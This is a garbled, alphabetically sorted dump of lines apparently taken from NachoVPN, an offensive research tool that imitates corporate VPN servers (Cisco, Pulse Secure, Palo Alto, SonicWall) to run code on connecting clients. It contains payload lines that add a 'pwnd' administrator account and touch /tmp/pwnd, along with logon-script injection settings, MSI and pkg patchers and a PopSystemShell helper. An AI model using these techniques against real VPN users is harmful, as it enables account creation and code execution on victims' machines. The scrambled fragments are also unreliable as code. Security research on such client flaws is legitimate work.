00000030  03 00 00 00 40 25 00 01 01 2c 00 00 0d 03 00 00   
00000040  00 40 26 00 01 01 2e 00 00 18 00 00 00 01 07 00   
00000050  00 10 00 00 ff ff 00 00 00 00 ff ff ff ff 00 00   
00000060  00 00 01 02 03 00 00 00 40 00 00 01 00 40 01 00   
00000070  01 00 40 1f 00 01 00 40 20 00 01 00 40 21 00 01   
00000080  00 40 05 00 04 00 00 05 78 00 03 00 04 01 01 01   
00000090  01 40 06 00 0d 6e 61 63 68 6f 76 70 6e 2e 6c 6f   
000000a0  6c 00 40 07 00 04 00 00 00 01 00 04 00 04 01 01   
000000b0  01 01 40 19 00 01 01 40 1a 00 01 00 40 24 00 01   
000000c0  01 40 0f 00 02 00 00 40 10 00 02 00 05 40 11 00   
000000d0  02 00 03 40 12 00 04 00 00 04 b0 40 13 00 04 00   
000000e0  00 00 00 40 14 00 04 00 00 00 01 40 15 00 04 00   
000000f0  00 00 00 40 16 00 02 11 94 40 17 00 04 00 00 00   
00000100  0f 40 18 00 04 00 00 00 3c 00 01 00 04 0a 0a 01   
00000110  01 00 02 00 04 ff ff ff ff 40 0b 00 04 0a c8 c8   
00000120  c8 40 0c 00 1d 43 3a 5c 57 69 6e 64 6f 77 73 5c   
00000130  53 79 73 74 65 6d 33 32 5c 63 61 6c 63 2e 65 78   
00000140  65 00 40 0d 00 01 00 40 0e 00 01 00 40 1b 00 01   
00000150  00 40 1c 00 01 00 00 13 00 01 00 00 14 00 01 00   
0106ee
1 minutes
1000))
127.0.0.1
2 minutes
3 minutes
5 minutes
<!--
<!-- End Windows 8.1 custom tile settings in 'Immersive' mode -->
<!-- Windows 8.1 custom tile settings in 'Immersive' mode -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- note for windows 8 -->
<!doctype html>
</AnyConnectProfile>
</AutoReconnect>
</ClientInitialization>
</EnableAutomaticServerSelection>
</EnableScripting>
</PPPExclusion>
</RetainVpnOnLogoff>
</ServiceProfiles>
</agent-user-override-key>
</application-desc>
</auth>
</body>
</body></html>
</capabilities>
</captive-portal-detection-msg>
</center>
</cert>
</config-auth>
</config>
</div>
</div></b></font>
</div></font>
</dns-suffix>
</file>
</form>
</head>
</html>
</jnlp>
</opaque>
</p>
</policy>
</prelogin-response>
</response>
</script>
</script><script> var isSAMLArray =new Array()
</select>
</service-profile-manifest>
</signature>
</style>
</table>
</tbody>
</td>
</tr>
</traffic-blocking-notification-msg>
</vpn-base-config>
</vpn-client-pkg-version>
</vpn-core-manifest>
</vpn-customization-manifest>
</vpn-profile-manifest>
</vpn>
</wins>
</xar>
<AllowLocalProxyConnections>false</AllowLocalProxyConnections>
<AllowManualHostInput>true</AllowManualHostInput>
<AuthenticationTimeout>30</AuthenticationTimeout>
<AutoServerSelectionImprovement>20</AutoServerSelectionImprovement>
<AutoServerSelectionSuspendTime>4</AutoServerSelectionSuspendTime>
<AutomaticVPNPolicy>false</AutomaticVPNPolicy>
<CaptivePortalRemediationBrowserFailover>false</CaptivePortalRemediationBrowserFailover>
<CertificateStore>All</CertificateStore>
<CertificateStoreLinux>All</CertificateStoreLinux>
<CertificateStoreMac>All</CertificateStoreMac>
<CertificateStoreOverride>false</CertificateStoreOverride>
<ClientInitialization>
<EnablePostSBLOnConnectScript>true</EnablePostSBLOnConnectScript>
<IPProtocolSupport>IPv4</IPProtocolSupport>
<LinuxLogonEnforcement>SingleLocalLogon</LinuxLogonEnforcement>
<LinuxVPNEstablishment>LocalUsersOnly</LinuxVPNEstablishment>
<ProxySettings>Native</ProxySettings>
<RetainVpnOnLogoff>false
<ShowPreConnectMessage>false</ShowPreConnectMessage>
<SuspendOnConnectedStandby>false</SuspendOnConnectedStandby>
<TerminateScriptOnNextEvent>false</TerminateScriptOnNextEvent>
<WindowsLogonEnforcement>SingleLocalLogon</WindowsLogonEnforcement>
<WindowsVPNEstablishment>AllowRemoteUsers</WindowsVPNEstablishment>
<aggauth-handle>864640002</aggauth-handle>
<application-desc>
<argument>(empty_domain)</argument>
<argument>-1</argument>
<argument>192.168.99.122</argument>
<argument>4100</argument>
<argument>4</argument>
<argument>532e8287b925b74d6925c6ada18f2d27da38665d</argument>
<argument></argument>
<argument>GlobalProtect Local Auth</argument>
<argument>bob</argument>
<argument>empty</argument>
<argument>f701c63e16880dc2aad5505e4ea17d19</argument>
<argument>tunnel</argument>
<argument>vsys1</argument>
<argument>woot gw-N</argument>
<auth-api>no</auth-api><region>192.168.0.0-192.168.255.255</region>
<auth-method>multiple-cert</auth-method>
<auth-method>single-sign-on</auth-method>
<authentication-message>Enter Portal password</authentication-message>
<authentication-message>Enter login credentials</authentication-message>
<autosubmit>false</autosubmit>
<b>NetExtender ActiveX Installer Instructions</b><br>
<base-package-uri>/CACHE/stc/1</base-package-uri>
<body class=loginbody leftmargin=0 topmargin=0 marginwidth=0 marginheight=0>
<body>
<br><br>
<br>You may be required to login again after launching.
<capabilities>
<ccusername></ccusername>
<center>
<center><h1>404 Not Found</h1></center>
<config-hash>1619719004259</config-hash>
<crypto-supported>ssl-dhe</crypto-supported>
<div class='buttons'>
<div class='processing'>
<div id='changePwContainer'>
<div id='epcValidateContainer'>
<div id='login_box_fields'>
<div id='login_box_sonicwall'  class='login_box_custom' >
<div id='login_box_sonicwall' >
<div id='login_table'>
<div id='otpContainer'>
<div id='pdaContainer'>
<div id='radiusChallengeContainer'>
<div id='rsaContainer'>
<div id='userPassFormContainer'>
<filename>scripts_{{ script['filename'] }}</filename>
<font class=loginError><B>Error:</b></font>
<font class=toolbar> The page you are trying to access is not available.</font>
<font color=
<form>
<group-alias>{{ vpn_name }}</group-alias>
<head>
<head><title>404 Not Found</title></head>
<hr><center></center>
<html>
<html><head><meta http-equiv='Content-Type' content='text/html
<img src='/images/loading_spinner.gif' alt='Processing...'> Processing...
<input type='password' name='password' id='password' class='required' autocomplete='off'><br>
<input type='text' name='username' id='username' class='required' autocomplete='off'><br>
<jnlp>
<label for='domain'>Domain:</label>
<label for='password'>Password:</label>
<label for='username'>Username:</label>
<license>yes</license>
<link href='/sma_content_overrides.10.2.1.7-50sv.css' type='text/css' rel='stylesheet'>
<link href='/sma_login_overrides.10.2.1.7-50sv.css' type='text/css' rel='stylesheet'>
<link href='/swl_header.10.2.1.7-50sv.css' type='text/css' rel='stylesheet'>
<link href='/swl_login.10.2.1.7-50sv.css' type='text/css' rel='stylesheet'>
<meta http-equiv='Content-Type' content='text/html
<meta http-equiv='cache-control' content='must-revalidate'>
<meta http-equiv='cache-control' content='no-cache'>
<meta http-equiv='pragma' content='no-cache'>
<msg></msg>
<newmsg></newmsg>
<noscript><font color=red>Please enable JavaScript on your browser before proceeding.</font></noscript>
<p><b>You have successfully logged out.</b></p>
<panos-version>1</panos-version>
<password-label>Password</password-label>
<policy>
<prelogin-response>
<saml-default-browser>yes</saml-default-browser>
<saml-default-browser>yes</saml-default-browser><region>GB</region>
<script type='text/javascript'>
<script>
<server-cert-hash>{{ server_cert_hash }}</server-cert-hash>
<session-id>106496</session-id>
<session-token>61D5E0@106496@2C64@1A03AA09D5B053ED6F58D56ABDF4EA125F12956C</session-token>
<status>Success</status>
<style type='text/css'>
<style>
<table cellpadding=0 cellspacing=0 border=0 margin=0>
<table width=430 border=0 margin=0 cellpadding=0 cellspacing=0>
<tbody>
<td cellpadding=0 cellspacing=0 width=200>
<td cellpadding=0 cellspacing=0 width=350 height=8>
<td cellpadding=0 cellspacing=0 width=350>
<td cellpadding=0 cellspacing=0>
<td colspan=2 cellpadding=0 cellspacing=0 width=350>
<td width=430>
<td width=99 class=bbcenter align=center valign=center height=21
<td>
<title>Page Not Found</title>
<title>Virtual Office</title>
<tr >
<tr cellpadding=0 cellspacing=0>
<tr valign=top>
<tr>
<tunnel-group>VPN2</tunnel-group>
<uri>/CACHE/stc/profiles/profile.xml</uri>
<username-label>Username</username-label>
<vpn-base-config>
<vpn-client-pkg-version>
<vpn-core-manifest>
<vpn-customization-manifest>
<vpn-profile-manifest>
<xar>
= (self.length 
= 100
= CREATE_UNICODE_ENVIRONMENT
= attr_len
= avp.to_bytes()
= b'
= chunk
= data
= f'<X509Certificate>{cert}</X509Certificate>'
= final_attrs  
= ip_bytes
= len(data)
= null
= os.urandom(32)                    
= os.urandom(4)                     
= reply.to_bytes()
= route_data
= route_entry
= self.create_routes()
= self.value
= self.write_be16(0)            
= self.write_be16(0)                   
= self.write_be16(0x2c00)              
= self.write_be16(0x2e00)              
= self.write_be16(0x2e00)                    
= self.write_be16(routes_len)                
= self.write_be32(0)
= self.write_be32(0)                   
= self.write_be32(0x00000000)          
= self.write_be32(0x00000001)          
= self.write_be32(0x000001FB)          
= self.write_be32(0x00000A4C)          
= self.write_be32(0x0000FFFF)
= self.write_be32(0x03000000)   
= self.write_be32(0x03000000)          
= self.write_be32(0x2e20f000)          
= self.write_be32(len(self.routes))          
= sig_len
= subnet_mask_bytes
ACTION_TYPE_CMD = 34
ACTION_TYPE_JSCRIPT = 6
ACTION_TYPE_SHELL = 50
AVP_LANGUAGE = 0xD5F
AVP_OS_INFO = 0xD5E
AVP_REALM = 0xD50
AVP_USER_AGENT = 0xD70
AVP_VENDOR = 0x80
Action
An example [docker-compose file](docker-compose.yml) is also provided for convenience.
Attributes
CFG_DISCONNECT_WHEN_ROUTES_CHANGED = 0x4000
CFG_DNS_SERVER = 0x0003
CFG_DNS_SUFFIX = 0x4006
CFG_ENFORCE_IPV4 = 0x4020
CFG_ENFORCE_IPV6 = 0x4021
CFG_ESP_ALLOW_6IN4 = 0x4024
CFG_ESP_ENC_ALG = 0x4010
CFG_ESP_HMAC_ALG = 0x4011
CFG_ESP_KEY_BYTES = 0x4013
CFG_ESP_KEY_LIFETIME = 0x4012
CFG_ESP_ONLY = 0x401A
CFG_ESP_PORT = 0x4016
CFG_ESP_REPLAY_PROTECTION = 0x4014
CFG_ESP_TO_SSL_FALLBACK_SECS = 0x4017
CFG_INTERNAL_GATEWAY_IP = 0x400B
CFG_INTERNAL_LEGACY_IP = 0x0001
CFG_LOGON_SCRIPT = 0x400C
CFG_LOGON_SCRIPT_MAC = 0x401B
CFG_MTU = 0x4005
CFG_NETMASK = 0x0002
CFG_TOS_COPY = 0x4015
CFG_TUNNEL_ROUTES_TAKE_PRECEDENCE = 0x4001
CFG_TUNNEL_ROUTES_WITH_SUBNET_ACCESS = 0x401f
CFG_UNKNOWN_4007 = 0x4007
CFG_UNKNOWN_400F = 0x400F
CFG_UNKNOWN_4018 = 0x4018
CFG_UNKNOWN_4019 = 0x4019
CFG_WINS_SERVER = 0x0004
CISCO_COMMAND_MACOS
CISCO_COMMAND_WIN
CLEANUP_EXIT:
COPY MANIFEST.in .
COPY entrypoint.sh .
COPY requirements.txt .
COPY setup.py .
COPY src/ src/
CSCOT
Cabinet
Captive Portal Detected
Component
ComponentId
Component_
Condition
Copyright (c) 2024 AmberWolf Ltd.
CustomAction
DISABLED_PLUGINS
DWORD FindProcessId(const wchar_t
Description
Directory_
DiskId
DiskPrompt
Display
EAP_FAILURE = 4
EAP_REQUEST = 1
EAP_RESPONSE = 2
EAP_SUCCESS = 3
EAP_TYPE_EXPANDED= 0xfe
ENC_AES_128_CBC = 2
ENC_AES_256_CBC = 5
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
EXAMPLE_ROUTES = [
EXPANDED_JUNIPER = ((EAP_TYPE_EXPANDED << 24) 
EXPOSE 443
EXPOSE 80
EXTERNAL_IP
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
FROM python:3.12-slim-bookworm
Feature
FeatureComponents
Feature_
Feature_Parent
File
FileName
FileSize
Flask==3.0.2
Global environment variables:
GlobalProtect has temporarily permitted network access for you to connect to the Internet. Follow instructions from your internet provider.
HMAC_MD5 = 1
HMAC_SHA1 = 2
HMAC_SHA256 = 3
IFT_CLIENT_AUTH_CHALLENGE = 5
IFT_CLIENT_AUTH_REQUEST = 3
IFT_CLIENT_AUTH_RESPONSE = 6
IFT_CLIENT_AUTH_SELECTION = 4
IFT_CLIENT_AUTH_SUCCESS = 7
IFT_TLS_CLIENT_INFO = 0x88
IFT_VERSION_REQUEST = 1
IFT_VERSION_RESPONSE = 2
JUNIPER_1 = 0xa4c01
Jinja2==3.1.3
KEEP_ALIVE_PACKET = bytes.fromhex('1a2b3c4d000000000000000000000000')
KeyPath
LICENSE_ID = ''.join(random.choices(string.ascii_uppercase 
Language
LastSequence
Level
MIT License
MarkupSafe==2.1.5
Media
MgmtTun</DeployDirectory>
MgmtTun</Directory>
NACAgent.exe
NELaunchX1 =  document.nelauncher_plugin
NELaunchX1.AddPendingRdp()
NELaunchX1.CheckNACAgentInstalled(epcversion)
NELaunchX1.Connect()
NELaunchX1.DownloadNxInstaller()
NELaunchX1.DownloadNxInstallerWithAsycMode()
NELaunchX1.EPCCheck()
NELaunchX1.InitLauncher()
NELaunchX1.InitNEServiceCtrl()
NELaunchX1.InstallNetExtender(1)
NELaunchX1.LaunchRdp()
NELaunchX1.OpenService()
NELaunchX1.RebootSystem()
NELaunchX1.ReleaseNeServiceCtrl()
NELaunchX1.SetIEProxy()
NELaunchX1.StartNEService()
NELaunchX1.ValidateServer()
NELaunchX1.allowDisableUpdate = 0
NELaunchX1.allowSavePassword = 0
NELaunchX1.allowSaveUser = 1
NELaunchX1.exitAfterDisconnect = 0
NELaunchX1.isSSLTunnel = 1
NELaunchX1.noProfileCreate = 0
NELaunchX1.policyEnforce = 0
NELaunchX1.startByBookmark = 0
NELaunchX1.startByBookmark = 1
NELaunchX1.tunnelAllMode = 0
NELaunchX1.uninstallAfterExit = 0
NE_IS_BAD_INSTALL = 1
NE_IS_REQUIRE_REBOOT = 2
NE_progBar
NachoVPN
NachoVPN can be installed from GitHub using pip. Note that this requires git to be installed.
NachoVPN is configured using environment variables. This makes it easily compatible with containerised deployments.
NachoVPN is licensed under the MIT license. See the [LICENSE](LICENSE) file for details.
NachoVPN supports the following plugins and capabilities:
Note: these values are from openconnect/pulse.c
Notice
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
PALO_ALTO_FORCE_PATCH
PALO_ALTO_MSI_ADD_FILE
PALO_ALTO_MSI_COMMAND
PALO_ALTO_PKG_COMMAND
PULSE_ANONYMOUS_AUTH
PULSE_DNS_SUFFIX
PULSE_LOGON_SCRIPT
PULSE_LOGON_SCRIPT_MACOS
PULSE_SAVE_CONNECTION
PULSE_USERNAME
Plugin specific environment variables:
Property
ROUTE_SPLIT_EXCLUDE = 0xf1000010
ROUTE_SPLIT_INCLUDE = 0x07000010
RUN apt-get update 
RUN chmod 
RUN pip install --no-cache-dir --upgrade pip setuptools wheel
RUN pip install --no-cache-dir -r requirements.txt
RUN pip install --no-cache-dir certbot
RUN pip install --no-cache-dir dist/
RUN python setup.py sdist bdist_wheel
References:
Run Code
SERVER_FQDN
SERVER_MD5_THUMBPRINT
SERVER_SHA1_THUMBPRINT
SKIP_CERTBOT
SOFTWARE.
SSL_VPN_MAGIC = bytes.fromhex('1a2b3c4d')
SSL_VPN_STATIC = bytes.fromhex('0100000000000000')
SYSTEM
Scripts
See: https://github.com/openconnect/openconnect/blob/master/pulse.c
Sequence
Source
Sub window_onLoad()
System32
Target
The above copyright notice and this permission notice shall be included in all
This will generate a certificate for the 
This will generate a self-signed certificate instead.
This will generate a wheel file in the 
Title
Type
USE_DYNAMIC_SERVER_THUMBPRINT
VENDOR_JUNIPER = 0xa4c
VENDOR_JUNIPER2 = 0x583
VENDOR_TCG = 0x5597
VPN_NAME
Value
Version
WORKDIR /app
WRITE_PCAP
We recommend the following mitigations:
We welcome contributions! Please open an issue or raise a Pull Request.
Werkzeug==3.0.1
Windows
You can build the container image with the following command:
You can run 
[video](https://www.youtube.com/watch
] Done! pkg file written to: {args.output}')
__all__ = [
__all__ = ['SonicWallPlugin']
__pycache__/
activate
add 5% to the progress bar's progress
alert(err)
alert(msg)
args):
avp.padding_required():]
background-color:'
background: url('/images/logo/VirtualOffice.gif') no-repeat left center
banner_logo { background: url(/images/logo/VirtualOffice.gif) no-repeat left center
bash
blinker==1.7.0
bool PopSystemShell() {
build/
cabarchive==0.2.4
calc.ex
calc.exe
call winclose()
certifi>=2024.2.2
certs
certs/
cffi==1.16.0
charset-normalizer==3.3.2
charset=UTF-8'>
check protected mode for IE
class AVP:
class Attribute:
class CTSP:
class CertManager:
class CiscoPlugin(VPNPlugin):
class DBManager:
class EAPPacket:
class ESPConfigGenerator:
class ExamplePlugin(VPNPlugin):
class IFTPacket:
class MSIDownloader:
class MSIPatcher:
class MSIPatcherLinux(MSIPatcher):
class MSIPatcherWindows(MSIPatcher):
class PacketHandler:
class PaloAltoPlugin(VPNPlugin):
class PluginManager:
class PulseConfig:
class PulseSecurePlugin(VPNPlugin):
class SonicWallPlugin(VPNPlugin):
class ThreadedVPNServer(socketserver.ThreadingTCPServer):
class VPNConfigGenerator:
class VPNPlugin:
class VPNServer:
class VPNStreamRequestHandler(BaseHTTPRequestHandler):
click==8.1.7
closeLegcyUIWarning()
cmd.exe
colorama==0.4.6
connect.nachovpn.local
context)
context):
copies or substantial portions of the Software.
cryptography==42.0.5
custom-logo {
def extract_cert_base64(cert_file):
def get_msi_patcher():
def load_be16(data):
def load_be32(data):
def load_le16(data):
def load_le32(data):
def main():
def random_hash():
def random_name(length=12):
def random_string(length=12):
dest_ip = socket.inet_ntoa(dest_ip_bytes)
dest_ip_bytes = packet.message_value[0x10:0x14]
dist
dist/
docker build -t nachovpn:latest .
docker pull ghcr.io/amberwolfcyber/nachovpn:release
docker run -e SERVER_FQDN=connect.nachovpn.local -e EXTERNAL_IP=1.2.3.4 -v ./certs:/app/certs -p 80:80 -p 443:443 --rm -it nachovpn
docker run -e SERVER_FQDN=connect.nachovpn.local -e SKIP_CERTBOT=1 -e EXTERNAL_IP=1.2.3.4 -p 443:443 --rm -it nachovpn
document.Login.loginButton.click()
document.getElementById('proxy_pass').focus()
document.getElementById('proxy_user').focus()
document.write('<center><br>Note:
downloads
downloads/
e.@....@....@...
else
else if (NE_IS_REQUIRE_REBOOT == is_status){
else if (typeof(isSAMLArray)!='undefined' 
else{
end sub
env/
errName = e.name
eval(code)
exec python -m nachovpn.server
f.loginButton.focus()
f.password.disabled = false
f.password.disabled = true
f.username.disabled = false
f.username.disabled = true
f.verifyCert.value = 0
f.verifyCert.value = 1
false
finishRebootNeed()
font-size: 15px
font-size:1px
from .plugin import CiscoPlugin
from .plugin import SonicWallPlugin
from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID
from cryptography.x509.oid import NameOID
from datetime import datetime
from http.server import BaseHTTPRequestHandler
from io import BytesIO
from jinja2 import Template
from nachovpn.core.cert_manager import CertManager
from nachovpn.core.db_manager import DBManager
from nachovpn.core.plugin_manager import PluginManager
from nachovpn.core.request_handler import VPNStreamRequestHandler
from nachovpn.core.utils import PacketHandler
from nachovpn.plugins import VPNPlugin
from nachovpn.plugins.base.plugin import VPNPlugin
from nachovpn.plugins.cisco.plugin import CiscoPlugin
from nachovpn.plugins.example.plugin import ExamplePlugin
from nachovpn.plugins.paloalto.pkg_generator import generate_pkg
from nachovpn.plugins.paloalto.plugin import PaloAltoPlugin
from nachovpn.plugins.pulse.plugin import PulseSecurePlugin
from nachovpn.plugins.sonicwall.plugin import SonicWallPlugin
function autoCertLogin()
function closeLegcyUIWarning() {
function downloadNACWait()
function finishInstall(){
function finishRebootNeed(){
function hideLegcyUIWarning() {
function isIEMetroMode()
function moveProgressbar(){
function neConnect(){
function neConnectWait(){
function neDownloadNx(){
function neDownloadNxOK(){
function neDownloadNxWait(){
function neInit(){
function neInstall(){
function neInstallOK(){
function neInstallWait(){
function neLaunch(){
function neLauncherInit(){
function neLauncherStart(){
function neStart(){
function neStartWait(){
function neUninstall(){
function neUninstallOK(){
function neUninstallWait(){
function neValidateServer(){
function onError(msg){
function onProxyAuthNextBtn(){
function proxyAuth(nextFunc){
function setColour( a ) {
function showLegcyUIWarning() {
function showLoginBoxFields(domainIndex)
function useContemporaryUI()
function winclose(){
git clone https://github.com/AmberWolfCyber/NachoVPN
height: 67px
height:'
height:0px
height:20px
htmlcov/
https://github.com/AmberWolfCyber/NachoVPN.git
idna==3.6
if ( time_cost >= timeout_neconnect){
if ( time_cost >= timeout_neinstall){
if ( time_cost >= timeout_nestart){
if ( time_cost >= timeout_neuninstall){
if (!$.browser.ie) {
if (!isIE){
if (!neInstallOK()){
if (!neUninstallOK()){
if ((!isIE)
if ((!isIE) 
if ((required_nesversion > NELaunchX1.serviceVersion)
if (0 != NELaunchX1.isNEServiceRunning){
if (0 != NELaunchX1.isNetExtenderInstalled){
if (0 != NELaunchX1.isNetExtenderInstalling){
if (0 != NELaunchX1.isRebootNeeded){
if (0 != NELaunchX1.statusId){
if (0 != autoConnectAfterLaunch){
if (0 != ret){
if (0 == NELaunchX1.isAdmin)
if (0 == NELaunchX1.isAdmin){
if (0 == NELaunchX1.isNEServiceRunning){
if (0 > NELaunchX1.statusId){
if (1 != NELaunchX1.isNetExtenderConnected){
if (1 != NELaunchX1.isVistaOrLater){
if (1 == NELaunchX1.isProtectedModeProcess){
if (1 == NELaunchX1.isVistaOrLater){
if (1 == dlStatus){
if (MAX_PROXY_AUTH_TRY < proxyAuthTry)
if (NE_25_MIN_VER > NELaunchX1.serviceVersion){
if (NE_CONNECT_ERROR_PROXYAUTHREQUIRE == NELaunchX1.statusId){
if (NE_INSTALL_ERROR_ADMINREQUIRE == NELaunchX1.installResult){
if (NE_INSTALL_ERROR_NONE == NELaunchX1.installResult){
if (NE_IS_SUCCESS == is_status){
if (isIE 
if (neInstallOK()){
if (neUninstallOK()){
if (progress_bar != null){
if (progress_bar.amt >= 1.0)
if (proxyAuthPage){
if (proxyNextFunction.value != nextFunc.value)
if (proxyPass == '')
if (proxyUser == '')
if (reboot){
if (reboot.checked){
if (rebootPage){
if (statusPage){
if (typeof(isCAArray)!='undefined' 
if (window.opener 
if __name__ == '__main__':
if os.name == 'nt':
if( !oDoc ) { oDoc = document
if( document.all ) { return document.all[divID]
if( document.getElementById ) { return document.getElementById(divID)
if( document.layers ) {
if( isDesktopMode == false )
if( isNaN( this.amt ) ) { this.amt = 0
if( isWin8Metro )
if( oDoc.layers[divID] ) { return oDoc.layers[divID]
if( theDiv.style ) { theDiv = theDiv.style
if(!launchRdp){
if(1 == ret)
if(3 == dlStatus){
if(NELaunchX1.isNACAgentDownloaded != 1)
if(NELaunchX1.statusId != 0)
if(nac_time_cost >= nac_timeout_install)
if(window!=top) {
import argparse
import base64
import certifi
import csv
import datetime
import hashlib
import inspect
import io
import ipaddress
import json
import logging
import nachovpn.plugins
import os
import random
import re
import requests
import shutil
import socket
import socketserver
import sqlite3
import ssl
import string
import struct
import subprocess
import sys
import tempfile
import threading
import traceback
import urllib.parse
import uuid
import warnings
import xml.etree.ElementTree as ET
import zlib
include <stdbool.h>
include <tlhelp32.h>
include <userenv.h>
include <windows.h>
include <wtsapi32.h>
install error
install is finished and sccessful
install staus
int main() {
isDesktopMode = false
isWin8Metro = isIEMetroMode()
itsdangerous==2.1.2
kwargs)
kwargs):
l.@.............
left:0px
legcyUIWarning').hide()
legcyUIWarning').show()
length].decode()
logging.basicConfig(
logging.debug('config header:')
logging.debug('final attributes:')
logging.debug('routing info:')
logging.debug('version marker 
logging.debug(toc_xml)
luid)) {
moveProgressbar()
msi_downloader.py
msi_version.txt
n NX_MAY_CHANGE_PASSWORD:0
n NX_TUNNEL_PROTO_VER: 2.0
n NX_WIN_MIN_GOOD_VERSION: 0x0a020153
n' )
nX-NE-sslvpnnac-deny: {}'
nac_time_cost 
nachovpn
nachovpn.local
name={self.vpn_name}
nbsp
nconnPacURL = 
nconnProxyByPass = 
nconnProxyURL = 
neConnect()
neDownloadNx()
neDownloadNxOK()
neLauncherInit()
neUninstall()
neValidateServer()
net user pwnd Passw0rd123! /add 
networks:
newConfigFiles</DeployDirectory>
newToken
newToken)) {
obj.appendChild(document.createTextNode(text))
obj.removeChild(el)
oldToken)) {
onError(strErrBadInstallation)
onError(strErrConnect)
onError(strErrConnecttimeout)
onError(strErrDownload)
onError(strErrEpcDownloadFail)
onError(strErrEpcInstallFail)
onError(strErrGUI)
onError(strErrInit)
onError(strErrInstall)
onError(strErrInstallFail)
onError(strErrInstallRequireAdmin)
onError(strErrInstalltimeout)
onError(strErrOpen)
onError(strErrProxyAuth)
onError(strErrRebootRequired)
onError(strErrStart)
onError(strErrStartRequireAdmin)
onError(strErrStarttimeout)
onError(strErrUninstall)
onError(strErrUninstalltimeout)
onError(strErrUpgradeRequireAdmin)
onError(strErrValidateServer)
padding-top:1px
padding_size:]
payloads
payloads/
pcaps/
pem==23.1.0
pi)) {
pip install -U setuptools wheel
pip install -e .
pip install dist/nachovpn-1.0.0-py3-none-any.whl
pip install git
plugin_kwargs)
position:absolute
privToken)) {
processInfo)) {
progress_bar = new progressBar(
progress_bar.setBar(0.04)
proxyAuth('neInstall()')
proxyAuth('neValidateServer()')
proxyAuthTry
proxyAuthTry = 1
proxyNextFunction = nextFunc
pulsesecureclient://connect
pycparser==2.21
pycryptodome==3.20.0
python -m nachovpn.server
python -m venv env
python setup.py bdist_wheel
python3 -m venv env
rDownloading: [{'=' 
rdpLauncherInit()
recursive-include src/nachovpn/plugins 
requests==2.31.0
reset to 5% to the progress bar's progress
return
return ((0 != NELaunchX1.isNetExtenderInstalled)
return (0 != NELaunchX1.isNetExtenderInstalled)
return document[divID]
return false
return true
return y
scapy==2.5.0
script
self.gateway_config)
self.hexdump(data)
self.hexdump(data[offset:])
services:
sessionId)
setup(
setup.py
setuptools
should
showLegcyUIWarning()
showLoginBoxFields(document.Login.domain.selectedIndex)
source env/bin/activate
store={str(self.pulse_save_connection).lower()}
sw_sso_fba_)/))
system32
system</Directory>
text-align:center
theDiv.bgColor = a
theDiv.left = ( ( this.dir != 3 ) 
theDiv.width = theWidth 
theHeight
theWidth
this.amt = ( typeof( b ) == 'undefined' ) 
this.dir = oDr
this.id = 'NE_progBar' 
time_cost 
time_cost = 0
time_cost = 100
time_cost = 500
top.location.href=location.href
top.location.href=window.document.location
top:0px
touch /tmp/pwnd
true
try {
try{
urllib3==2.2.1
userrealm=Users
v=-MZfkmcZRVg)]
v=-MZfkmcZRVg)].
var MAX_PROXY_AUTH_TRY = 3
var NE_25_MIN_VER = 0x02050000
var NE_CONNECT_ERROR_PROXYAUTHREQUIRE = 2
var NE_INSTALL_ERROR_ADMINREQUIRE = 2
var NE_INSTALL_ERROR_NONE = 0
var NE_INSTALL_ERROR_SERVICEFAIL = 1
var NE_IS_SUCCESS= 0
var NE_progBar = 0
var agent = navigator.userAgent.toLowerCase()
var autoConnectAfterLaunch =1
var dlStatus = NELaunchX1.downloadStatus
var errName 
var f = document.Login
var isDesktopMode 
var isIE = true
var isWin8Metro = false
var is_status = NELaunchX1.installationStatus
var launchRdp = 0
var nac_time_cost = 0
var nac_timeout_install = 180000
var oPix = document.childNodes 
var progress_bar = null
var proxyAuthTry = 0
var proxyNextFunction = ''
var proxyPass = ''
var proxyUser = ''
var required_nesversion = 0x00000000
var ret = NELaunchX1.isNetExtenderConnected
var theDiv = getRefToDivNest( this.id )
var theHeight = Math.round( this.height 
var theWidth = Math.round( this.width 
var time_cost = 0
var timeout_neconnect = 120000
var timeout_neinstall = 300000
var timeout_nestart = 60000
var timeout_neuninstall = 300000
var timer_id
var winpops=0
venv/
wheel
while(el = obj.childNodes[0]){
width: 146px
width:'
width:0
window.close()
window.opener.top.location.href = location.href
window.opener=''
windows
x entrypoint.sh
x00'
x00' 
x00'               
x00')
x00'))           
x00')[0].decode()
x00')[0].decode())
x01')
x01')                      
x01')                              
x0D' 
x10' 
x10'))           
x1c')                              
z-index:1
z-index:2
z-index:3
{%- endfor %}
{%- endif -%}
{%- for script in script_hashes -%}
{%- if script['hash'] %}
{cab_name}')
{printable_data}
{{ ca_certificate }}
{{ cisco_command_macos }}
} catch (e)
} catch (err) {
}catch(err){
}else if (0 < NELaunchX1.statusId){
}else if (0 > NELaunchX1.statusId){
}else if(2 == dlStatus){
}else{
